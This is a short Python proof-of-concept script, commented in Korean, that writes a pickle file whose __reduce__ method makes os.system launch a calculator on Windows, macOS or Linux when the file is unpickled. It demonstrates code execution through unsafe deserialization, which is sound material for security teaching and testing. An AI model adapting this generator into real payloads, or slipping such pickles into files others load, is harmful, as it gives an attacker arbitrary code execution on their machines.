# malicious_pickle_generator.py 실행
import pickle
import os
import platform

class RunCalc:
    def __reduce__(self):
        os_name = platform.system()
        if os_name == 'Windows':
            command = 'calc.exe'
        elif os_name == 'Darwin':
            command = 'open -a Calculator'
        else:
            command = 'gnome-calculator'
        return (os.system, (command,))

with open("malicious.pkl", "wb") as f:
    pickle.dump(RunCalc(), f)

print("악성 pickle 파일 'malicious.pkl'이 생성되었습니다.")